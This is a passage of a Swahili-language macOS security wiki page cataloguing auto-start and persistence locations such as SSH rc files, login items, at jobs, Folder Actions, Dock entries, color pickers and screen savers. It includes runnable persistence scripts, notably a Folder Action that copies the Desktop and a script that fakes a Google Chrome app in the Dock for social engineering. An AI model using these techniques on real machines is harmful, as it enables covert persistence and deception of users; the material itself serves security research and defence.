  - Matumizi ya SSH yanaweza kutoa ufikiaji wa FDA

#### Mahali

- **`~/.ssh/rc`**
  - **Kichochezi**: Kuingia kupitia ssh
- **`/etc/ssh/sshrc`**
  - Inahitaji root
  - **Kichochezi**: Kuingia kupitia ssh

> [!CAUTION]
> Kuwasha ssh kunahitaji Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Maelezo na Unyonyaji

Kwa chaguomsingi, isipokuwa `PermitUserRC no` iwekwe kwenye `/etc/ssh/sshd_config`, mtumiaji **anapoingia kupitia SSH**, hati **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.<sup>[[14]](#references)</sup>

### **Vipengee vya Kuingia**

Maelezo: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Yafaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji kutekeleza `osascript` pamoja na args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **Programu saidizi ya kipengee cha kuingia kilichosajiliwa:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (mahali pa kawaida pa vipengee vilivyounganishwa).
  - **Kichochezi:** Usajili unaweza kuanzisha programu saidizi mara moja; kisha huanza kwenye miingio ya baadaye ya mtumiaji, kulingana na idhini.
- **Agent/daemon iliyounganishwa na kusajiliwa:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` au `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Kichochezi:** Agent iliyoidhinishwa inaweza kuanza wakati wa usajili na kwenye miingio ya baadaye; daemon iliyoidhinishwa huanza wakati wa kuwasha mfumo. Daemon huhitaji idhini ya msimamizi.

#### Maelezo

Katika **Mipangilio ya Mfumo → Jumla → Vipengee vya Kuingia na Viendelezi**, watumiaji wanaweza kukagua vipengee vya kuingia na vya usuli. macOS 13 na matoleo ya baadaye hutoa [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) kwa ajili ya kusajili vipengee vya kuingia, launch agents na launch daemons vilivyounganishwa. Tabia ya [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) hutofautiana kulingana na aina na hali ya idhini. **Kuweka programu saidizi ndani ya kifurushi cha programu hakutoshi kusajili kipengee kipya cha kuingia.** Kinyume chake, ikiwa executable ya programu saidizi iliyosajiliwa tayari inaweza kuandikwa, kuibadilisha kunaweza kuathiri uzinduzi wake unaofuata bila usajili mpya; thibitisha kwanza njia halisi na ukaguzi wa code-signing.

Ifuatayo ni njia ya kusoma pekee ya kutafuta programu saidizi zilizounganishwa kwenye Mac; haisajili wala kuzindua yoyote kati yake:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Kwa launch plist iliyojumuishwa, tafuta `BundleProgram` **ikilinganishwa na mzizi wa app bundle** (kwa mfano `Contents/MacOS/Helper`), kama ilivyoelekezwa katika [mwongozo wa Apple wa kuhamia Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Ukaguzi wa orodha ya `/Applications` wa kusoma pekee kwenye Mac ya utafiti ulipata maingizo 14 ya helper zilizojumuishwa na matamko matano ya `BundleProgram`; lengwa zote tano zilipatikana, na mbili zilifaulu ukaguzi wa uwezekano wa kuandikwa na mtumiaji. Ukaguzi huo **hauthibitishi** kwamba helper mojawapo imesajiliwa, imewezeshwa, inaweza kutekelezwa baada ya uthibitishaji wa sahihi, au inaweza kufikiwa na sandbox. `sfltool dumpbtm` iliorodhesha rekodi 150 zenye majina kwenye Mac hii; ni zana ya ukaguzi, si jaribio linalothibitisha kwamba kila rekodi inaendeshwa.

Vipengee vya zamani vya kuingia pia vinaweza kudhibitiwa kupitia Apple events. Inawezekana kuviorodhesha, kuviongeza na kuviondoa kupitia mstari wa amri, ingawa kuviongeza hubadilisha usanidi endelevu wa kuingia wa mtumiaji na huenda kukahitaji idhini ya Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` ni maelezo ya utekelezaji, si eneo linaloungwa mkono la kusakinisha payload kwa kuandika faili tu. API ya zamani ya `SMLoginItemSetEnabled` imebadilishwa na `SMAppService` kwa helper mpya; njia ya awali ya ukurasa `/var/db/com.apple.xpc.launchd/loginitems.501.plist` haikuwepo kwenye mashine ya majaribio ya macOS 26.5.2. Tumia API ya usajili na hali ya UI ya mfumo unapokagua Login Item za kisasa, badala ya kudhani kuwa njia fulani ya hifadhidata ipo.

### ZIP kama Login Item

(Angalia sehemu iliyotangulia kuhusu Login Item; hii ni nyongeza)

Ukihifadhi faili ya **ZIP** kama **Login Item**, **`Archive Utility`** itaifungua. Ikiwa, kwa mfano, zip ilihifadhiwa ndani ya **`~/Library`** na ilikuwa na Folder ya **`LaunchAgents/file.plist`** yenye backdoor, Folder hiyo itaundwa (haipo kwa chaguo-msingi) na plist itaongezwa. Kwa hiyo, mtumiaji atakapoingia tena, **backdoor iliyoonyeshwa kwenye plist itatekelezwa**.

Chaguo jingine ni kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji; hivyo, hata kama Folder ya LaunchAgents tayari ipo, mbinu hii bado itafanya kazi.

### At

Maelezo: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Inafaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji **kutekeleza** **`at`**, na lazima iwe **imewezeshwa**
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Unahitaji **kutekeleza** **`at`**, na lazima iwe **imewezeshwa**

#### **Maelezo**

Kazi za `at` zimeundwa kwa ajili ya **kuratibu kazi za mara moja** zitakazotekelezwa nyakati maalum. Tofauti na kazi za cron, kazi za `at` huondolewa kiotomatiki baada ya kutekelezwa. Ni muhimu kutambua kuwa kazi hizi hudumu hata mfumo unapowashwa upya, jambo linalozifanya ziwe hatari kwa usalama katika hali fulani.<sup>[[16]](#references)</sup>

`com.apple.atrun.plist` iliyojumuishwa ina `Disabled = true`, lakini launchd huhifadhi kando mipangilio ya kubatilisha hali ya kuwezeshwa/kuzimwa inayotumika. Kwenye mashine ya majaribio ya macOS 26.5.2, `launchctl print-disabled system` ilionyesha kuwa `com.apple.atrun` **imewezeshwa**, licha ya ufunguo huo uliowekwa. Kagua hali inayotumika kabla ya kudai kuwa kazi za `at` zitatekelezwa:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Msimamizi anaweza kuwezesha huduma ya `atrun` iliyozimwa kwa kutumia `launchctl`; mfano ufuatao wa kihistoria hubadilisha hali ya huduma ya mfumo na **haukuendeshwa** kwenye Mac ya utafiti:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Hii itaunda faili baada ya saa 1:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Kagua foleni ya kazi kwa kutumia `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Hapo juu tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuchapisha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Ikiwa tasks za AT hazijawezeshwa, tasks zilizoundwa hazitatekelezwa.

**Faili za kazi** zinapatikana kwenye `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Jina la faili lina foleni, nambari ya kazi, na muda uliopangwa wa kuendeshwa. Kwa mfano, tuangalie `a0001a019bdcd2`.

- `a` - hii ndiyo foleni
- `0001a` - nambari ya kazi katika hex, `0x1a = 26`
- `019bdcd2` - muda katika hex. Unawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika desimali. Tukizidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. April 27., Tuesday 7:46:00`.

Tukichapisha faili ya kazi, tunaona kuwa ina taarifa zilezile tulizopata kwa kutumia `at -c`.

### Arifa za Calendar za kufungua faili

- **Lengwa la uandishi:** App bundle inayoweza kutekelezwa au faili nyingine **ambayo tayari imechaguliwa** na arifa maalum ya **Open file** ya tukio la Calendar. Kuunda au kuhariri arifa yenyewe kunahitaji ufikiaji wa tukio hilo la kalenda kupitia Calendar au chanzo cha data ya kalenda kilichokubaliwa; kuandika faili yoyote hakutengenezi arifa.
- **Kichochezi:** Muda uliopangwa wa arifa kwenye Mac ambako Calendar huchakata tukio hilo. Tukio linalojirudia linaweza kurudia kitendo hicho. [Mwongozo wa sasa wa Calendar wa Apple](https://support.apple.com/guide/calendar/icl1012/mac) unathibitisha chaguo la arifa la **Custom → Open file** kwenye macOS 26.
- **Utambulisho wa utekelezaji na masharti:** Calendar hufungua faili iliyochaguliwa kwa mtumiaji aliyeingia kupitia programu inayohusishwa nayo. Kuzindua app bundle kunaweza kutekeleza msimbo wake kama mtumiaji huyo, kutegemea Gatekeeper, quarantine, na ukaguzi mwingine wa macOS. Faili ya script isiyo na chochote kingine inaweza kufunguliwa tu katika kihariri; kiendelezi chake pekee hakithibitishi utekelezaji wa msimbo.

Ili kutathmini faili inayoweza kufaa kwa usalama, kagua arifa ya tukio katika Calendar na ruhusa za faili iliyochaguliwa. Njia hii iliandikwa kwa kutumia mwongozo wa Apple na **haikujaribiwa** kwenye Mac ya utafiti kwa sababu kuijaribu kungebadilisha kalenda inayotumika na kuhitaji kusubiri tukio la eneo-kazi. Jaribio katika akaunti ya muda linaweza kuchagua app bundle yenye alama pekee, kuweka arifa ya Open file ya muda mfupi ujao, kuthibitisha uzinduzi, kisha kufuta tukio na app.

### Automations za Shortcuts kwenye macOS

- **Lengwa la uandishi:** Faili inayoweza kutekelezwa **ambayo tayari imerejelewa** na kitendo cha shortcut, au shortcut iliyopo ambayo mtumiaji aliyeidhinishwa anaweza kuhariri. Faili yoyote ya `.shortcut` au uandishi katika hifadhidata ya Shortcuts ambayo haijaandikwa kwenye nyaraka si njia inayoungwa mkono ya kusajili automation.
- **Kichochezi na utambulisho:** Tukio la automation lililowekwa awali na kuwezeshwa, kama vile muda fulani wa siku au tukio la app, huendesha shortcut kwa mtumiaji aliyeingia. [Mwongozo wa sasa wa Apple wa automations za Mac](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) unaorodhesha matukio yanayoungwa mkono, unaeleza wakati automation inaweza kuendeshwa bila kuuliza, na unaeleza jinsi ya kuondoa kichochezi. [Mwongozo wa faragha wa Shortcuts wa Apple](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) unahitaji **Allow Running Scripts** kwa vitendo vya script, na vitendo maalum bado vinaweza kuomba ruhusa.

Hii ni njia ya masharti ya uandishi hadi utekelezaji **ikiwa tu kitendo kilichopo kinapakia lengwa linaloweza kuandikwa**. Kuunda automation mpya kupitia UI hubadilisha mipangilio inayotumika na hakukujaribiwa kwenye Mac ya utafiti. Katika akaunti ya muda, mmiliki anaweza kusanidi shortcut ya muda fulani wa siku ambayo script yake huandika alama kwenye `/tmp/ht-shortcuts-marker`, kuwezesha ruhusa zinazohitajika, kuthibitisha alama baada ya tukio, kisha kufuta automation, shortcut, na alama.

### Vitendo vya Automator na Quick Actions

- **Malengo ya uandishi:** `~/Library/Automator/*.action` (mtumiaji) na `/Library/Automator/*.action` (msimamizi) kwa action bundles. Workflow ya Quick Action iliyohifadhiwa kwa kawaida huwekwa kwenye `~/Library/Services/*.workflow`; kagua njia halisi ya workflow iliyochaguliwa na mtumiaji. [Marejeleo ya mfumo wa Automator ya Apple](https://developer.apple.com/documentation/automator) yanaorodhesha saraka za kutafuta actions.
- **Kichochezi:** Automator hupakia action bundles zinazopatikana inapotekelezwa, lakini kazi ya action huendeshwa workflow inayoitumia inapotekelezwa. Quick Action huendeshwa mtumiaji anapoichagua kutoka Finder, Services, au menyu nyingine inayoionyesha. Workflow ya Folder Action huendeshwa vitu vinapoongezwa kwenye folda yake **ambayo tayari imeunganishwa**, na workflow ya Calendar Alarm huendeshwa wakati wa tukio lake. [Aina za workflow za Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) hutofautisha matukio haya. Kuandika tu action au workflow hakuunganishi folda wala kupanga tukio la kalenda.
- **Utambulisho wa utekelezaji na masharti:** Akaunti inayoendesha workflow; Automator au app inayoianzisha lazima ipakie action, na ukaguzi wowote wa sasa wa kusaini msimbo au faragha lazima uruhusu. Action bundle inayoweza kuandikwa ambayo tayari imerejelewa na workflow inayotumika ni hali tofauti na kusakinisha action mpya na kusubiri ichaguliwe.

Saraka za mtumiaji `Automator` na `Services` zilikuwepo kwenye Mac ya majaribio ya macOS 26.5.2; `/Library/Automator` haikuwepo. Hakuna workflow inayotumika iliyoundwa, kuunganishwa, au kutekelezwa. Tumia akaunti ya muda na action/workflow yenye alama pekee ili kuthibitisha njia mahususi ya upakiaji. Sehemu tofauti ya [Folder Actions](#folder-actions) inazungumzia chanzo hicho cha tukio kwa undani zaidi.

### Folder Actions

Maelezo: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Maelezo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Muhimu kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji kuweza kuita `osascript` na hoja ili kuwasiliana na **`System Events`** na kuweza kusanidi Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Ina ruhusa za msingi za TCC kama Desktop, Documents na Downloads

#### Mahali

- **`/Library/Scripts/Folder Action Scripts`**
  - Inahitaji root
  - **Kichochezi**: Ufikiaji wa folda iliyobainishwa
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Kichochezi**: Ufikiaji wa folda iliyobainishwa

#### Maelezo na Unyonyaji

Folder Actions ni scripts zinazoanzishwa kiotomatiki na mabadiliko katika folda, kama vile kuongeza au kuondoa vitu, au vitendo vingine kama kufungua au kubadilisha ukubwa wa dirisha la folda. Vitendo hivi vinaweza kutumiwa kwa kazi mbalimbali, na vinaweza kuanzishwa kwa njia tofauti, kama kutumia UI ya Finder au amri za terminal.<sup>[[17]](#references)[[18]](#references)</sup>

Ili kusanidi Folder Actions, una chaguo kama:

1. Kutengeneza workflow ya Folder Action kwa [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuisakinisha kama huduma.
2. Kuambatisha script mwenyewe kupitia Folder Actions Setup kwenye menyu ya muktadha wa folda.
3. Kutumia OSAScript kutuma ujumbe wa Apple Event kwa `System Events.app` ili kusanidi Folder Action kupitia programu.
   - Njia hii ni muhimu hasa kwa kuingiza action kwenye mfumo, na kutoa kiwango fulani cha persistence.

Script ifuatayo ni mfano wa kile kinachoweza kutekelezwa na Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Ili kufanya script iliyo hapo juu itumike na Folder Actions, i-compile kwa kutumia:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Baada ya script kukompiliwa, sanidi Folder Actions kwa kutekeleza script iliyo hapa chini. Script hii itawezesha Folder Actions kote na kuambatisha script iliyokompiliwa awali kwenye folda ya Desktop.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Endesha script ya usanidi kwa kutumia:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Hivi ndivyo unavyotekeleza persistence hii kupitia GUI:

Hii ndiyo script itakayotekelezwa:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Itunge kwa kutumia: `osacompile -l JavaScript -o folder.scpt source.js`

Ihamishie kwenye:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Kisha, fungua programu ya `Folder Actions Setup`, chagua **folda unayotaka kufuatilia** kisha uchague **`folder.scpt`** katika hali yako (kwangu niliiita output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ukifungua folda hiyo kwa kutumia **Finder**, script yako itatekelezwa.

Mipangilio hii ilihifadhiwa kwenye **plist** iliyopo katika **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwa muundo wa base64.

Sasa, hebu tujaribu kuandaa persistence hii bila ufikiaji wa GUI:

1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** hadi `/tmp` ili kuihifadhi kama nakala ya akiba:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Folder Actions ulizoweka hivi punde:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sasa kwa kuwa mazingira yetu hayana kitu

3. Nakili faili ya akiba: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua Folder Actions Setup.app ili kutumia mipangilio hii: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Hili halikufanya kazi kwangu, lakini hayo ndiyo maagizo kutoka kwenye writeup:(

### Njia za mkato za Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Ni muhimu kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji kuwa na programu hasidi iliyosakinishwa ndani ya mfumo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `~/Library/Preferences/com.apple.dock.plist`
  - **Kichochezi**: Mtumiaji anapobofya programu iliyo ndani ya Dock

#### Maelezo na Unyonyaji

Programu zote zinazoonekana kwenye Dock zimeainishwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Inawezekana **kuongeza programu** kwa kutumia tu:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Kwa kutumia **social engineering**, unaweza **kuiga, kwa mfano, Google Chrome** ndani ya Dock na kuendesha script yako mwenyewe:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Mbinu za Kuingiza

- **Lengo la kuandika:** App bundle ya input method yenye code iliyosakinishwa kwenye `~/Library/Input Methods/` (mtumiaji) au `/Library/Input Methods/` (msimamizi). Hii ni tofauti na faili za Apple za `.inputplugin` za plain-text za kupanga vitufe, ambazo zenyewe si payload ya arbitrary-code.
- **Kichochezi:** Mtumiaji huongeza/kuwezesha input source katika **System Settings → Keyboard → Text Input**, kisha huichagua au kuitumia. Bundle iliyokopiwa tu kwenye directory si uthibitisho kwamba macOS itaiendesha. [Mwongozo wa sasa wa Apple wa Input Sources](https://support.apple.com/guide/mac-help/mchl84525d76/mac) unaeleza kuwezesha na kubadilisha sources; [nyaraka za Apple za InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) zinahusu input methods zenye code.
- **Utambulisho wa utekelezaji na masharti:** Method huendeshwa kwa mtumiaji aliyeingia, kwa kuzingatia usajili wa input method, code-signing, na ukaguzi wa sasa wa usalama wa macOS. Mbinu zilizowezeshwa tayari zenye executable inayoweza kuandikwa zinahitaji ukaguzi tofauti wa path na signature.

Taarifa ya zamani ya Apple kuhusu input methods za wahusika wengine [ilionya](https://developer.apple.com/library/archive/qa/qa1810/_index.html) kwamba kunakili baadhi ya palette methods kwenye directories hizi hakuzifanyi hata zionekane katika Input Sources. Kwenye Mac ya utafiti yenye macOS 26.5.2, directory ya mtumiaji ipo, lakini hakuna bundle iliyosakinishwa au kuamilishwa; kwa hiyo, hii ni path ya masharti iliyoandikwa kwenye nyaraka, si matokeo ya runtime ya ndani.

### Vichagua Rangi

Maelezo: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Inafaa kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Kitendo mahususi sana kinahitaji kufanyika
  - Utaishia kwenye sandbox nyingine
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/Library/ColorPickers`
  - Root inahitajika
  - Kichochezi: Tumia color picker
- `~/Library/ColorPickers`
  - Kichochezi: Tumia color picker

#### Maelezo na Exploit

**Compile bundle ya color picker** yenye code yako (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na uongeze constructor (kama ilivyo katika sehemu ya [Screen Saver](macos-auto-start-locations.md#screen-saver)), kisha unakili bundle hiyo kwenye `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Kisha, color picker inapowashwa, bundle yako inapaswa pia kutekelezwa.

Hili hutegemea app inayooana kufungua paneli ya rangi ya mfumo na kuchagua picker iliyosakinishwa. [Mwongozo wa Apple wa color panel](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) unaeleza mahali pa legacy bundle. Ukaguzi wa path wa ndani ulipata legacy color-picker XPC service, lakini hakuna picker iliyosakinishwa au kupakiwa kwenye Mac ya utafiti; usihitimishe kuwa kuna TCC bypass kwa kutegemea path pekee.

Kumbuka kuwa binary inayopakia library yako ina **sandbox yenye vizuizi vikali sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Ni muhimu kwa kukwepa sandbox: **Hapana, kwa sababu unahitaji kutekeleza app yako mwenyewe**
- Kukwepa TCC: Hutegemea sandbox na ruhusa za extension iliyowezeshwa; hakuna njia ya jumla ya kukwepa iliyothibitishwa.

#### Mahali

- App maalum

#### Maelezo na Exploit

Mfano wa application yenye Finder Sync Extension [**unaweza kupatikana hapa**](https://github.com/D00MFist/InSync).

Applications zinaweza kuwa na `Finder Sync Extensions`. Extension hii itawekwa ndani ya application itakayotekelezwa. Zaidi ya hayo, ili extension iweze kutekeleza code yake, **lazima isainiwe** kwa cheti halali cha msanidi wa Apple, lazima iwe **sandboxed** (ingawa vighairi vinavyolegeza vizuizi vinaweza kuongezwa), na lazima isajiliwe kwa kitu kama:<sup>[[21]](#references)[[22]](#references)</sup>

Extension iliyosakinishwa pia inahitaji **kuwezeshwa** na kuitwa kwa eneo au kipengee husika cha Finder; kuandika kifurushi cha kiholela cha `.appex` hakutoshi. [Finder Sync API ya Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) huonyesha hali ya kuwezeshwa. Amri za `pluginkit` zilizo hapa chini zinaonyesha usajili na uwezeshaji wa moja kwa moja, si kuanzisha kiotomatiki kwa kuweka faili pekee. Njia hii ilikaguliwa kwa kutumia nyaraka, bila kusakinisha au kuwezesha extension mpya kwenye Mac ya utafiti.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Kihifadhi Skrini

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Inafaa kwa kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini utaishia katika sandbox ya kawaida ya programu
- Kupita TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/System/Library/Screen Savers`
  - Root inahitajika
  - **Kichocheo**: Chagua kihifadhi skrini
- `/Library/Screen Savers`
  - Root inahitajika
  - **Kichocheo**: Chagua kihifadhi skrini
- `~/Library/Screen Savers`
  - **Kichocheo**: Chagua kihifadhi skrini

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Maelezo na Exploit

Unda mradi mpya katika Xcode na uchague kiolezo cha kutengeneza **Screen Saver** mpya. Kisha, ongeza msimbo wako kwake, kwa mfano msimbo ufuatao wa kutengeneza logi.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** mradi huo, kisha nakili bundle ya `.saver` kwenye **`~/Library/Screen Savers`**. Halafu, fungua GUI ya Screen Saver na uibofye tu; inapaswa kutengeneza logi nyingi:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
